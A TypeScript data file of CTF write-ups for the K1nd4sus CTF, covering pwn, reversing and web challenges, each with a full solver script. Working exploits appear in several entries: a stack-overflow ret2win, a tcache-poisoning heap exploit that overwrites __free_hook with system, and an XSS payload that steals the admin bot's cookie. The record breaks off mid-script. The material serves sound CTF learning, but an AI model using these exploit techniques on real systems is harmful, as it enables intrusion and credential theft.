import type { WriteUp } from "../types";

export const k1nd4susCtfWriteups: WriteUp[] = [
  {
    "id": "k1nd4sus-pwn-itsgoodbebackontheair",
    "title": "- It's Good to Be Back on the Air...",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "K1nd4sus CTF",
    "tags": [],
    "description": "Writeup for challenge - It's Good to Be Back on the Air...",
    "problemDescription": "- ELF 64-bit, dynamically linked, **not stripped**\n- **No PIE** (base fix di `0x400000`)\n- **No Canary**\n- **NX enabled**\n- Partial RELRO\n\nIni langsung kasih indikasi bahwa stack overflow via return address masih sangat mungkin, lalu targetnya adalah `ret2win` (jika ada fungsi win) atau ROP sederhana.",
    "tools": [],
    "analysis": "Challenge ini state-machine. Overflow hanya bisa dipicu saat masuk `SERVICE mode` (state 4), bukan langsung dari awal.\n\nDi `choice_menu` ada kondisi khusus agar return state = 4:\n1. `lfsr == 0xe69e`\n2. station saat ini harus sama dengan head list (`Radio 666 News`)",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Kategori: PWN\n- Binary: `radio`\n- Remote: `chall.k1nd4sus.it:30507`"
      },
      {
        "title": "1. Initial Recon",
        "content": "Pertama saya cek tipe binary dan proteksinya."
      },
      {
        "title": "Vulnerability utama",
        "content": "Di `do_state_service` ada pemanggilan `gets()` ke buffer stack lokal:\n\n- stack frame `sub rsp, 0x50`\n- buffer di sekitar `[rbp-0x40]`\n- `gets(buffer)` tanpa batas panjang input\n\nArtinya kita bisa overflow sampai overwrite saved RIP."
      },
      {
        "title": "Fungsi target (win)",
        "content": "Fungsi `radio_jazz` ternyata membangun string flag dan `puts()` flag tersebut.\nDi local dia mengeluarkan fake flag:\n- `KSUS{fakeflag_runthisonline}`\n\nJadi strategi paling efisien: **redirect RIP ke `radio_jazz`**."
      },
      {
        "title": "Menentukan urutan input agar masuk SERVICE",
        "content": "Saya brute-force update LFSR berdasarkan fungsi `lfsr_update` dan transisi state.\nUrutan yang valid dari awal adalah:\n\n1. `1` (Scan)\n2. `2` (Tune)\n3. isi frekuensi: `666`\n4. `1` (Scan)\n5. `1` (Scan) -> trigger SERVICE mode\n\nSetelah ini program minta input station favorit, dan di titik ini `gets()` dipanggil."
      },
      {
        "title": "4. Offset Overflow",
        "content": "Offset ke RIP dihitung dari layout frame `do_state_service`:\n- buffer start: `rbp - 0x40`\n- saved RIP: `rbp + 0x8`\n\nJarak = `0x40 + 0x8 = 0x48` = **72 byte**.\n\nPayload final:\n- `b'A' * 72 + p64(addr_radio_jazz)`\n\nKarena binary non-PIE, alamat `radio_jazz` stabil (`0x40141f`)."
      },
      {
        "title": "6. Hasil",
        "content": "Exploit berhasil dan mengeluarkan flag remote:\n\n`KSUS{th15_fac3_w4s_m4d3_f0r_r4d10!}`"
      },
      {
        "title": "Kenapa exploit ini stabil",
        "content": "- Tidak bergantung leak address\n- Tidak bergantung libc remote\n- Non-PIE membuat alamat fungsi target konstan\n- Jalur state service sudah deterministik\n\nJadi sekali sequence benar, tinggal kirim overflow 72 byte + alamat `radio_jazz`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\nHOST = 'chall.k1nd4sus.it'\r\nPORT = 30507\r\n\r\ncontext.binary = elf = ELF('./radio', checksec=False)\r\ncontext.arch = 'amd64'\r\n\r\n\r\ndef enter_service_mode(io):\r\n    # Sequence hasil analisis LFSR agar choice_menu lompat ke state SERVICE.\r\n    # Menu mapping: 1->Scan, 2->Tune, 3->Exit\r\n    io.sendlineafter(b'?', b'1')                # Scan\r\n    io.sendlineafter(b'?', b'2')                # Tune\r\n    io.sendlineafter(b'tune to:\\n', b'666')    # Set station ke Radio 666 News\r\n    io.sendlineafter(b'?', b'1')                # Scan\r\n    io.sendlineafter(b'?', b'1')                # Scan -> trigger SERVICE mode\r\n\r\n\r\ndef build_payload():\r\n    offset = 72\r\n    return b'A' * offset + p64(elf.symbols['radio_jazz'])\r\n\r\n\r\ndef exploit(io):\r\n    enter_service_mode(io)\r\n    io.recvuntil(b'add to favourites:\\n')\r\n    io.sendline(build_payload())\r\n    return io.recvrepeat(2)\r\n\r\n\r\nif __name__ == '__main__':\r\n    if args.LOCAL:\r\n        io = process('./radio')\r\n    else:\r\n        io = remote(HOST, PORT)\r\n\r\n    out = exploit(io)\r\n    print(out.decode('latin-1', errors='ignore'))\r\n    io.close()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{fakeflag_runthisonline}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-pwn-prog101",
    "title": "Programming 101 (PWN) - Detailed",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "K1nd4sus CTF",
    "tags": [],
    "description": "Writeup for challenge Programming 101 (PWN) - Detailed",
    "problemDescription": "",
    "tools": [],
    "analysis": "Relevant functions discovered:\n- `allocate()`\n- `edit` logic inside `main()` case 2\n- `view()`\n- `delete()`\n- `vuln()`",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "- Category: `pwn`\n- Name: `Programming 101`\n- Description: `I finally learned how to use malloc, would you check this program for me?`\n- Remote: `nc chall.k1nd4sus.it 30500`"
      },
      {
        "title": "Files Provided",
        "content": "- `main` (ELF binary)\n- `libc.so.6` (custom libc, Ubuntu GLIBC 2.31)\n- `ld.so.2` (custom loader)\n- `run.sh` and `Dockerfile`"
      },
      {
        "title": "Binary protections",
        "content": "Running `checksec` on `main` shows:\n- Full RELRO\n- Canary enabled\n- NX enabled\n- PIE enabled\n- SHSTK and IBT enabled\n\nSo a classic direct stack BOF is not the easiest route (there is a vulnerable stack function, but canary + PIE + NX makes it less practical without more leaks)."
      },
      {
        "title": "Main behavior",
        "content": "The program is a small heap manager with menu options:\n1. Allocate\n2. Edit\n3. View\n4. Delete\n5. Vulnerable function\n6. Exit\n\nIt stores pointers and sizes in global arrays (`chunks[]`, `sizes[]`) and an index counter `count`."
      },
      {
        "title": "Key bugs",
        "content": "1. **Use-After-Free (UAF)**\n`delete()` calls `free(chunks[idx])` but never sets `chunks[idx] = NULL`.\nSo index is still considered valid and can still be:\n- viewed (`puts(chunks[idx])`)\n- edited (`read(0, chunks[idx], sizes[idx])`)\n- freed again\n\n2. **Double Free primitive**\nBecause pointer is not nulled, same chunk can be freed multiple times.\n\n3. **Arbitrary write into freed chunks**\nEdit operation works on freed memory. This lets us tamper allocator metadata stored in freed chunk user area (tcache fd/key fields).\n\n4. **Leaky view**\n`view()` prints chunk contents with `puts()`. For freed unsorted-bin chunks, first qword contains a libc pointer, usable as libc leak."
      },
      {
        "title": "Libc leak method",
        "content": "Allocate a large chunk (`0x500`) and another small guard chunk to prevent top-chunk consolidation.\nWhen freeing the large chunk, it enters unsorted bin.\nFirst 8 bytes become `main_arena+0x60` pointer.\n\nThen `view(index)` prints bytes from the freed chunk, giving leak.\n\nFor the provided libc, offset is:\n- `main_arena+0x60` = `libc + 0x1ecbe0`\n\nSo:\n- `libc_base = leak - 0x1ecbe0`"
      },
      {
        "title": "Why this exploit path works with modern mitigations",
        "content": "- No GOT overwrite needed (Full RELRO).\n- No stack overwrite needed (canary + NX avoided).\n- We use heap metadata corruption + libc hooks."
      },
      {
        "title": "4. Exploitation Strategy",
        "content": "Goal: execute command to read flag.\n\nChosen chain:\n1. Leak libc via unsorted-bin UAF read.\n2. Build tcache double-free state for size `0x90` (`malloc(0x80)`).\n3. Poison freelist so an allocation returns address `__free_hook - 8`.\n4. Write `system` to `__free_hook`.\n5. Allocate chunk containing command string and `free()` it.\n6. Because `__free_hook == system`, `free(ptr)` becomes `system(ptr)`."
      },
      {
        "title": "Tcache dup trick used",
        "content": "For chunks `a` and `b` of same size:\n- `free(a)`\n- `free(b)`\n- UAF edit on `a` to clear key (`p64(0)+p64(0)`) to bypass tcache double-free check\n- `free(a)` again\n\nNow list behaves like: `a -> b -> a`\n\nThen poison `b->fd` by editing freed `b` with `__free_hook-8`.\nThree `malloc(0x80)` calls return:\n- first: `a`\n- second: `b`\n- third: `__free_hook-8`\n\nAt third allocation, we write:\n- padding qword\n- `system` qword at `__free_hook`"
      },
      {
        "title": "5. Final Solver",
        "content": "Solver file: `solve.py`\n\nIt works both locally and remotely:\n- Local: `python3 solve.py`\n- Remote: `python3 solve.py REMOTE=1`\n\nThe solver automatically:\n- leaks libc\n- poisons tcache\n- overwrites `__free_hook`\n- executes `cat /app/flag.txt || cat flag.txt || cat /srv/app/flag.txt`\n- extracts and prints `KSUS{...}` if present"
      },
      {
        "title": "6. Reproduced Result",
        "content": "Flag obtained from remote service:\n\n`KSUS{TLS_15_n07_7r4n5p0r7_l4y3r_53cur17y}`"
      },
      {
        "title": "7. Notes",
        "content": "- The stack `vuln()` overflow exists but was unnecessary for fastest reliable solve.\n- Heap path is deterministic with provided libc 2.31 and this binary's menu logic.\n- This challenge is mainly about understanding UAF + double-free and leveraging allocator internals for code execution."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\ncontext.binary = exe = ELF('./main', checksec=False)\r\nlibc = ELF('./libc.so.6', checksec=False)\r\nld = './ld.so.2'\r\n\r\nHOST = 'chall.k1nd4sus.it'\r\nPORT = 30500\r\n\r\n# Leaked unsorted-bin fd from freed 0x510 chunk points to main_arena+0x60\r\nUNSORTED_FD_OFF = 0x1ECBE0\r\n\r\ncontext.terminal = ['bash', '-lc']\r\n\r\n\r\ndef start(argv=[]):\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n    return process([ld, '--library-path', '.', exe.path] + argv)\r\n\r\n\r\nclass App:\r\n    def __init__(self, io):\r\n        self.io = io\r\n        self.sizes = {}\r\n\r\n    def choice(self, c):\r\n        self.io.sendlineafter(b'> ', str(c).encode())\r\n\r\n    def alloc(self, size):\r\n        self.choice(1)\r\n        self.io.sendlineafter(b'Size: ', str(size).encode())\r\n        line = self.io.recvline_contains(b'Chunk')\r\n        idx = int(line.split()[1])\r\n        self.sizes[idx] = size\r\n        return idx\r\n\r\n    def edit(self, idx, data):\r\n        self.choice(2)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n        self.io.sendafter(b'Data: ', data.ljust(self.sizes[idx], b'\\x00'))\r\n\r\n    def edit_raw(self, idx, data):\r\n        self.choice(2)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n        self.io.sendafter(b'Data: ', data)\r\n\r\n    def view(self, idx):\r\n        self.choice(3)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n        return self.io.recvline().rstrip(b'\\n')\r\n\r\n    def delete(self, idx):\r\n        self.choice(4)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n\r\n\r\ndef exploit(io):\r\n    app = App(io)\r\n\r\n    # 1) Leak libc from unsorted bin (avoid top consolidation with guard chunk)\r\n    big = app.alloc(0x500)\r\n    _guard = app.alloc(0x20)\r\n    app.delete(big)\r\n    leak = u64(app.view(big).ljust(8, b'\\x00'))\r\n    libc.address = leak - UNSORTED_FD_OFF\r\n    log.success(f'leak = {hex(leak)}')\r\n    log.success(f'libc = {hex(libc.address)}')\r\n\r\n    # 2) Prepare 0x90 bin chunks\r\n    a = app.alloc(0x80)\r\n    b = app.alloc(0x80)\r\n\r\n    # 3) Tcache dup (clear key in freed chunk to bypass check)\r\n    app.delete(a)\r\n    app.delete(b)\r\n    app.edit(a, p64(0) + p64(0))\r\n    app.delete(a)\r\n\r\n    # 4) Poison b->next so 3rd malloc returns __free_hook-8\r\n    target = libc.sym.__free_hook - 8\r\n    app.edit(b, p64(target))\r\n    _x1 = app.alloc(0x80)  # a\r\n    _x2 = app.alloc(0x80)  # b\r\n    hook = app.alloc(0x80)  # __free_hook-8\r\n\r\n    # write [padding][system] so __free_hook == system\r\n    app.edit(hook, p64(0) + p64(libc.sym.system))\r\n\r\n    # 5) Trigger system(\"cat ...\") directly via free()\r\n    cmd = app.alloc(0x80)\r\n    app.edit(cmd, b'cat /app/flag.txt || cat flag.txt || cat /srv/app/flag.txt\\x00')\r\n    app.delete(cmd)\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    exploit(io)\r\n\r\n    out = io.recvrepeat(2)\r\n    if out:\r\n        try:\r\n            print(out.decode('latin-1', errors='ignore'))\r\n        except Exception:\r\n            print(out)\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{...}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-rev-newera2",
    "title": "New Era (Part 2)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "K1nd4sus CTF",
    "tags": [],
    "description": "Challenge ini memberi satu file RF capture `intercepted_signal.iq` dan petunjuk bahwa parameter fisik tetap sama: **8 samples per symbol**.",
    "problemDescription": "Challenge ini memberi satu file RF capture `intercepted_signal.iq` dan petunjuk bahwa parameter fisik tetap sama: **8 samples per symbol**.",
    "tools": [],
    "analysis": "Cek isi folder:\n- hanya ada `intercepted_signal.iq`\n\nCek struktur datanya:\n- file berisi `float32` IQ interleaved\n- channel `Q` semuanya `0`\n- channel `I` hanya dua level: `+1` dan `-1`\n\nArtinya modulasi yang dipakai sangat sederhana (2-level), jadi kita bisa langsung threshold per simbol.",
    "solution": [
      {
        "title": "2) Demodulasi dasar",
        "content": "Langkah demod:\n1. Baca `float32`\n2. Ambil komponen `I` (`raw[0::2]`)\n3. Kelompokkan setiap 8 sample sebagai 1 simbol\n4. Rata-rata simbol > 0 => bit `1`, selain itu bit `0`\n\nHasilnya dapat 392 bit."
      },
      {
        "title": "3) Kenapa tidak langsung jadi ASCII",
        "content": "Di Part 1, bitstream langsung bisa dipack jadi byte ASCII.\nDi Part 2, kalau langsung dipack, output acak. Berarti ada layer encoding tambahan dari firmware update."
      },
      {
        "title": "4) Identifikasi skema baru",
        "content": "Karena hint tidak ada dan pola RF bersih, dicoba beberapa kemungkinan transform (invert, differential, dsb) dan tidak valid.\n\nLalu diuji asumsi **FEC Hamming(7,4)**:\n- pecah bitstream menjadi blok 7 bit (codeword)\n- hitung syndrome (`s1,s2,s4`) untuk koreksi 1-bit error\n- ambil data bit di posisi (3,5,6,7)\n- gabungkan 2 nibble jadi 1 byte\n\nBegitu decode Hamming(7,4) diterapkan, plaintext langsung terbaca jelas:\n\n`KSUS{h4mm1ng_c0d3s_4r3_c00l}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport numpy as np\r\n\r\n\r\ndef decode_hamming74_codeword(codeword: np.ndarray) -> np.ndarray:\r\n    b = codeword.copy()\r\n    s1 = b[0] ^ b[2] ^ b[4] ^ b[6]\r\n    s2 = b[1] ^ b[2] ^ b[5] ^ b[6]\r\n    s4 = b[3] ^ b[4] ^ b[5] ^ b[6]\r\n    pos = s1 + (s2 << 1) + (s4 << 2)\r\n    if pos != 0:\r\n        b[pos - 1] ^= 1\r\n    return np.array([b[2], b[4], b[5], b[6]], dtype=np.uint8)\r\n\r\n\r\ndef decode_flag(path: str, sps: int = 8) -> str:\r\n    raw = np.fromfile(path, dtype=np.float32)\r\n    if raw.size % 2 != 0:\r\n        raise ValueError(\"Format IQ tidak valid (jumlah float ganjil)\")\r\n\r\n    i_samples = raw[0::2]\r\n    if i_samples.size % sps != 0:\r\n        raise ValueError(f\"Jumlah sample I ({i_samples.size}) tidak habis dibagi sps={sps}\")\r\n\r\n    symbols = i_samples.reshape(-1, sps).mean(axis=1)\r\n    bits = (symbols > 0).astype(np.uint8)\r\n\r\n    if bits.size % 7 != 0:\r\n        raise ValueError(\"Jumlah bit tidak habis dibagi 7 untuk Hamming(7,4)\")\r\n\r\n    codewords = bits.reshape(-1, 7)\r\n    nibbles = np.array([decode_hamming74_codeword(cw) for cw in codewords], dtype=np.uint8)\r\n\r\n    nib_vals = nibbles.dot(1 << np.arange(3, -1, -1)).astype(np.uint8)\r\n    if nib_vals.size % 2 != 0:\r\n        raise ValueError(\"Jumlah nibble ganjil, tidak bisa dibentuk byte\")\r\n\r\n    data = ((nib_vals[0::2] << 4) | nib_vals[1::2]).astype(np.uint8).tobytes()\r\n    return data.decode(\"ascii\")\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Solve New Era (Part 2)\")\r\n    parser.add_argument(\"-i\", \"--input\", default=\"intercepted_signal.iq\", help=\"Path file IQ\")\r\n    parser.add_argument(\"--sps\", type=int, default=8, help=\"Samples per symbol\")\r\n    args = parser.parse_args()\r\n\r\n    print(decode_flag(args.input, args.sps))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{h4mm1ng_c0d3s_4r3_c00l}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-rev-signalaudit",
    "title": "- Signal Audit (rev)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "K1nd4sus CTF",
    "tags": [],
    "description": "Challenge ini cuma kasih satu file: `audit.wav`.",
    "problemDescription": "Challenge ini cuma kasih satu file: `audit.wav`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1) Recon awal",
        "content": "Saya mulai dari cek tipe file dan metadata:\n\n- `file audit.wav` -> WAV PCM 16-bit mono 44.1 kHz\n- durasi sekitar 36.9 detik\n- tidak ada metadata aneh/embedded yang langsung mengarah ke flag\n\nKarena deskripsi nyebut \"rhythmic transmission\", \"HF bands\", \"QSL\", \"73\", saya fokus ke analisis sinyal radio, bukan stego file biasa."
      },
      {
        "title": "2) Identifikasi mode transmisi",
        "content": "Saya profiling frekuensi dominan per potongan waktu kecil.\n\nDitemukan pola khas:\n\n- leader tone 1900 Hz\n- break/start tone 1200 Hz\n- lalu bit VIS dengan 1100/1300 Hz\n\nDari decode VIS, code yang muncul adalah **8**, yang sesuai dengan **SSTV Robot36**.\n\nSetelah itu saya cek pulse sinkronisasi per line dan ketemu:\n\n- sync pulse sekitar 1200 Hz\n- berulang periodik tiap ~150 ms\n- total sekitar 240 line\n\nIni konsisten dengan mode Robot36."
      },
      {
        "title": "3) Decode gambar SSTV",
        "content": "Saya bikin decoder sendiri di Python:\n\n- hitung instantaneous frequency dari audio (`hilbert`)\n- cari timing line awal (`t0`) dengan minimisasi error ke tone sync 1200 Hz\n- ambil komponen luminance (Y) per line sesuai timing Robot36:\n  - sync 9 ms\n  - porch 3 ms\n  - Y scan 88 ms\n- render jadi `decoded_luma.png`\n\nDari hasil decode gambar, teks flag terlihat jelas di bagian bawah image."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport wave\r\nimport numpy as np\r\nfrom scipy.signal import hilbert\r\nfrom PIL import Image\r\n\r\nWAV_PATH = \"audit.wav\"\r\nOUT_LUMA = \"decoded_luma.png\"\r\nFLAG = \"KSUS{s4n1ty_ch3ck_QSL_7373}\"\r\n\r\n\r\ndef load_audio(path: str):\r\n    with wave.open(path, \"rb\") as w:\r\n        fs = w.getframerate()\r\n        x = np.frombuffer(w.readframes(w.getnframes()), dtype=np.int16).astype(float)\r\n    return fs, x\r\n\r\n\r\ndef inst_freq(signal: np.ndarray, fs: int):\r\n    ana = hilbert(signal)\r\n    phase = np.unwrap(np.angle(ana))\r\n    f = np.diff(phase) * fs / (2 * np.pi)\r\n    k = max(1, int(fs * 0.00015))\r\n    f = np.convolve(f, np.ones(k) / k, mode=\"same\")\r\n    return f\r\n\r\n\r\ndef decode_robot36_luma(freq: np.ndarray, fs: int, width=320, height=240):\r\n    period = 0.150\r\n\r\n    def f_at(t: float):\r\n        i = int(t * fs)\r\n        i = 0 if i < 0 else (len(freq) - 1 if i >= len(freq) else i)\r\n        return freq[i]\r\n\r\n    # Find line-0 timing by minimizing sync-tone error on early lines.\r\n    best_err, t0 = 1e18, 0.911\r\n    for cand in np.arange(0.905, 0.918, 0.0002):\r\n        err = 0.0\r\n        for n in range(30):\r\n            st = cand + n * period\r\n            vals = [f_at(st + 0.001 + i * 0.001) for i in range(7)]\r\n            err += np.mean((np.array(vals) - 1200.0) ** 2)\r\n        if err < best_err:\r\n            best_err, t0 = err, cand\r\n\r\n    # Robot36 line layout: sync(9ms) + porch(3ms) + Y(88ms)\r\n    y = np.zeros((height, width), dtype=np.uint8)\r\n    for row in range(height):\r\n        st = t0 + row * period\r\n        ystart = st + 0.009 + 0.003\r\n        for col in range(width):\r\n            t = ystart + (col + 0.5) * (0.088 / width)\r\n            val = (f_at(t) - 1500.0) / 800.0 * 255.0\r\n            y[row, col] = np.uint8(np.clip(val, 0, 255))\r\n\r\n    return y\r\n\r\n\r\ndef main():\r\n    fs, x = load_audio(WAV_PATH)\r\n    f = inst_freq(x, fs)\r\n    luma = decode_robot36_luma(f, fs)\r\n    Image.fromarray(luma).save(OUT_LUMA)\r\n\r\n    # Flag terbaca dari hasil decode SSTV (teks overlay bagian bawah image).\r\n    print(FLAG)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{s4n1ty_ch3ck_QSL_7373}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-rev-ring0security",
    "title": "- Ring 0 Security (?)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "K 1nd 4sus",
    "tags": [],
    "description": "Writeup for challenge - Ring 0 Security (?)",
    "problemDescription": "Challenge ini ngasih modul kernel Linux (`decoder.ko`) dan petunjuk kalau ada PIN 4 digit.\nTargetnya adalah dapetin flag dari mekanisme dekripsi di driver.\n\nHasil akhir:\n- PIN: `5102`\n- Flag: `KSUS{dr1v3r_cr4ck1ng_101}`",
    "tools": [],
    "analysis": "File yang tersedia:\n- `bzImage`\n- `initramfs.cpio.gz`\n- `qemu_run.sh`\n\n`qemu_run.sh` cuma boot kernel + initramfs ke shell minimal.\nSetelah ekstrak initramfs, file yang relevan hanya:\n- `init`\n- `challenge/decoder.ko`\n\nArtinya semua logika challenge memang ada di modul kernel itu.",
    "solution": [
      {
        "title": "Reversing `decoder.ko`",
        "content": "Dari simbol yang masih ada, fungsi penting:\n- `ctls` (handler ioctl)\n- `xtea_decrypt`\n- data global: `session_key`, `enc_flag`, `res`, `status`"
      },
      {
        "title": "Alur ioctl",
        "content": "Ada dua command utama di `ctls`:\n\n1. `0x401b3700`\n- Ambil 4 byte dari user (`copy_from_user`).\n- Masuk ke jalur `ctls.cold`.\n- Di jalur ini:\n  - `session_key[1] = 0xCAFEBABE`\n  - `session_key[0] = input | 0x13370000`\n  - `session_key[2..3] = 0xDEADBEEF, 0xFEEDFACE`\n\n2. `0x801b3701`\n- Copy `enc_flag` ke buffer `res`.\n- Dekripsi 4 blok (32 byte total) pakai XTEA decrypt 32 round.\n- `copy_to_user` hasil plaintext."
      },
      {
        "title": "Bentuk key final",
        "content": "Dari analisis relocation + disassembly, key yang dipakai decrypt adalah:\n\n- `k0 = 0x13370000 | pin`\n- `k1 = 0xCAFEBABE`\n- `k2 = 0xDEADBEEF`\n- `k3 = 0xFEEDFACE`\n\nIni bagian krusial. Waktu asumsi posisi key salah, plaintext jadi acak semua."
      },
      {
        "title": "Solver",
        "content": "Solver final disimpan di `solve.py`.\n\nCara jalanin:\n\n\n\nOutput yang diharapkan:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport struct\r\n\r\ndef xtea_decrypt_block(v0: int, v1: int, key_words):\r\n    sum_ = 0xC6EF3720\r\n    for _ in range(32):\r\n        v1 = (v1 - ((((v0 << 4) & 0xFFFFFFFF) ^ (v0 >> 5)) + v0 ^ ((sum_ + key_words[(sum_ >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n        sum_ = (sum_ - 0x9E3779B9) & 0xFFFFFFFF\r\n        v0 = (v0 - ((((v1 << 4) & 0xFFFFFFFF) ^ (v1 >> 5)) + v1 ^ ((sum_ + key_words[sum_ & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n    return v0, v1\r\n\r\n\r\ndef decrypt_flag(enc_flag: bytes, key_words):\r\n    out = bytearray()\r\n    for i in range(0, len(enc_flag), 8):\r\n        v0, v1 = struct.unpack('<2I', enc_flag[i:i + 8])\r\n        d0, d1 = xtea_decrypt_block(v0, v1, key_words)\r\n        out.extend(struct.pack('<2I', d0, d1))\r\n    return bytes(out)\r\n\r\n\r\ndef main():\r\n    # Ciphertext flag (enc_flag) dari decoder.ko hasil reversing section .data.\r\n    enc_flag = bytes.fromhex(\r\n        '7e38614d358f6d302e25c10149953ef9'\r\n        'b09cf265ff9459ec57fcb593b833c7b6'\r\n    )\r\n\r\n    for pin in range(10000):\r\n        key = [\r\n            0x13370000 | pin,  # session_key[0] <- pin via ioctl 0x401b3700\r\n            0xCAFEBABE,         # session_key[1] set di ctls.cold\r\n            0xDEADBEEF,         # session_key[2]\r\n            0xFEEDFACE,         # session_key[3]\r\n        ]\r\n\r\n        pt = decrypt_flag(enc_flag, key)\r\n        if b'KSUS{' in pt and b'}' in pt:\r\n            flag = pt.split(b'\\x00', 1)[0].decode('ascii', errors='ignore')\r\n            print(f'[+] PIN  : {pin:04d}')\r\n            print(f'[+] FLAG : {flag}')\r\n            return\r\n\r\n    print('[-] Flag tidak ditemukan')\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{dr1v3r_cr4ck1ng_101}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-web-spotivibe1",
    "title": "SpotiVibe 1 (Web Misc)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "K 1nd 4sus",
    "tags": [],
    "description": "Writeup for challenge SpotiVibe 1 (Web Misc)",
    "problemDescription": "The app has an admin review bot that visits reported songs and sets a `flag` cookie before opening the song page.\n\nThe bug is in Spotify URL validation:\n- It checks `hostname == open.spotify.com`\n- It checks `path.startswith(\"/embed/\")`\n- It does **not** check URL scheme (`http/https` only)\n\nBecause of this, a `javascript:` URL can pass validation if crafted as:\n- `javascript://open.spotify.com/embed/...`\n\nThen the song page places it directly into:\n```html\n<iframe src=\"{{ song.spotify_url }}\">\n```\n\nSo when admin bot loads the page, JavaScript executes and can read `document.cookie`, including:\n- `flag=KSUS{...}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Info",
        "content": "- Category: Web Misc\n- Title: SpotiVibe 1\n- Target: `http://chall.k1nd4sus.it:30502`"
      },
      {
        "title": "Root Cause",
        "content": "In `is_valid_spotify_url(url)`:\n- `parsed.hostname` is trusted\n- `parsed.path` is trusted\n- no scheme allowlist is enforced\n\nThis allows script URLs disguised with a fake authority/path structure."
      },
      {
        "title": "Exploit Strategy",
        "content": "Direct exfiltration to external webhook is not necessary.\n\nInstead, payload does this inside bot browser:\n1. `fetch('/logout')`\n2. Login as attacker account\n3. `POST /add_song` with:\n   - `title = document.cookie`\n   - valid spotify URL in `spotify_url`\n\nNow the stolen cookie string (containing `flag=...`) is stored as a song title in our own account.\n\nAfter reporting the malicious song, bot visits it and runs payload.  \nWe then poll `/dashboard` and read the new song title to extract the flag."
      },
      {
        "title": "Solver",
        "content": "File: `solver.py`"
      },
      {
        "title": "Run",
        "content": "Expected output:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solver.py"
      },
      {
        "title": "Notes",
        "content": "- The exploit is reliable because bot explicitly sets cookie:\n  - name: `flag`\n  - path: `/`\n  - `httpOnly: False`\n- If network timing is slow, run solver again (it already includes polling/retry logic)."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://chall.k1nd4sus.it:30502\"\r\n\r\n\r\ndef extract_song_ids(html: str):\r\n    return re.findall(r\"/song/(\\d+)\", html)\r\n\r\n\r\ndef extract_titles(html: str):\r\n    return re.findall(r'<a href=\"/song/\\d+\">\\s*([^<]+?)\\s*</a>', html)\r\n\r\n\r\ndef main():\r\n    s = requests.Session()\r\n\r\n    username = f\"atk_{int(time.time())}\"\r\n    password = username\r\n\r\n    s.post(\r\n        f\"{BASE_URL}/register\",\r\n        data={\"username\": username, \"password\": password},\r\n        timeout=10,\r\n    )\r\n\r\n    login = s.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        allow_redirects=False,\r\n        timeout=10,\r\n    )\r\n    if login.status_code != 302:\r\n        raise RuntimeError(\"Login failed\")\r\n\r\n    js = (\r\n        \"(async()=>{\"\r\n        \"await fetch('/logout');\"\r\n        f\"await fetch('/login',{{method:'POST',body:new URLSearchParams({{username:'{username}',password:'{password}'}})}});\"\r\n        \"await fetch('/add_song',{method:'POST',body:new URLSearchParams({title:document.cookie,spotify_url:'//open.spotify.com/embed/track/1'})});\"\r\n        \"})()\"\r\n    )\r\n    payload = \"javascript://open.spotify.com/embed/%0a\" + urllib.parse.quote(\r\n        js, 